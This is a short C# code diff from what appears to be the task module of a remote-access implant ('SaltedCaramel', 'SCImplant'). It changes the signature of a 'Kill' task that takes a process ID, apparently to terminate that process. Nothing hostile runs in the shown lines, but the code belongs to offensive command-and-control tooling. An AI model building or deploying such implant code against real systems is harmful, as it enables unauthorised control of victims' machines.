@@ -5,7 +5,7 @@ namespace SaltedCaramel.Tasks
 {
     public class Kill
     {
-        public static void Execute(SCTask task)
+        public static void Execute(SCTask task, SCImplant agent)
         {
             int pid = Convert.ToInt32(task.@params);
             try
